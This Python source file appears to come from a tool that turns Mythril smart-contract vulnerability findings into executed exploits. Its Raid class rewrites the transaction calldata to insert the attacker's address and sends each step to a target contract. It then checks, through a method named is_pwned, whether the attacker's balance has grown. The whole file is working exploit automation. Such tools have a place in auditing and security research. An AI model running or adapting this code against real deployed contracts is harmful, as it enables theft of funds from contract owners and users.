from mythril.analysis.report import Issue
from typing import List
from .helper import W3


class Step:
    """Represents one exploitation step (transaction)"""

    def __init__(self, call_data: str, call_value: int):
        self.call_value = call_value
        self.call_data = call_data

    def func_hash(self) -> str:
        """ Returns the function signature hash (first eight characters of calldata)

        :returns: function hash starting with '0x"

        """

        return self.call_data[:10]

    def func_args(self) -> str:
        """ Returns the function arguments (everything following the func hash)

        :returns: calldata string

        """

        return self.call_data[10:]

    def replace_raw(self, offset, new: str) -> None:
        """ Replace a chunk of calldata

        :param offset: Byte offset into calldata ('0x' is not counted)
        :param new: Replacement string ('0102aa..')
        :returns"

        """

        self.call_data = (
            self.call_data[: 2 + offset * 2]
            + new
            + self.call_data[2 + (offset * 2) + len(new) :]
        )

    def replace_uint(self, offset, value: int, size: int = 256) -> None:
        """ Replace an uint256 value in calldata

        :param offset: Byte offset into calldata (e.g. 4 = first arguemnt)
        :param value: Replacement value
        :param size: Integer width in bits
        :returns:

        """

        hex_string = format(value, "x").zfill(int(size / 4))

        self.replace_raw(offset, hex_string)

    def __repr__(self):
        return '{}(func_hash()="{}",func_args()={},value={})'.format(
            self.__class__.__name__, self.func_hash(), self.func_args(), self.call_value
        )

    def pretty(self) -> str:
        return "Call data: {} {}, call value: {}".format(
            self.func_hash(), self.func_args(), self.call_value
        )


class Raid:
    """This class represents an exploit sequence containing of one or
    multiple steps. It also executes the transactions via a W3 instance
    provided during construction.

    """

    def __init__(self, sender: str, target: str, issue: Issue, w3: W3):
        self.sender = sender
        self.target = target
        self.issue = issue
        self.steps = self.parse_issue(issue)
        self.fix_calldata()
        self.initial_balance = w3.balance(sender)
        self.w3 = w3

    def __repr__(self):
        return '{}(target={},type="{}",steps={})'.format(
            self.__class__.__name__,
            self.target,
            self.issue.description_head,
            self.steps,
        )

    def pretty(self) -> str:
        formatted = "{}".format(self.issue.description_head)

        for i in range(0, len(self.steps)):
            formatted += "\n  {}: {}".format(i, self.steps[i].pretty())

        return formatted

    @staticmethod
    def parse_issue(issue: Issue) -> List[Step]:
        """Extract a list of Steps from a Mythril issue.

        :param offset: Issue returned buy Mythril
        :returns: List of Steps

        """

        result = []
        tx_sequence = issue.transaction_sequence
        steps = tx_sequence["steps"]

        for step in steps:
            result.append(Step(call_data=step["input"], call_value=step["value"]))

        return result

    def fix_calldata(self) -> None:
        """Replace ATTACKER_ADDRESS in the calldata with the address of the actual attacker.

        :returns:

        """
        for step in self.steps:
            step.call_data = step.call_data.replace(
                "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", self.sender[2:]
            )

    def execute_step(self, i: int) -> None:
        """Execute a single step

        :param i: Step index
        :returns:

        """
        self.w3.request_blocking(
            self.sender, self.target, self.steps[i].call_value, self.steps[i].call_data
        )

    def execute(self) -> None:
        """Execute all steps

        :returns: True if attack was successful, false is otherwise.

        """
        for i in range(0, len(self.steps)):
            self.execute_step(i)

        return self.is_pwned()

    def is_pwned(self) -> bool:
        """Check whether the exploit was successful (i.e. the attacker's balance has increased).

        :returns: True if attack was successful, false otherwise.

        """
        return self.w3.balance(self.sender) > self.initial_balance
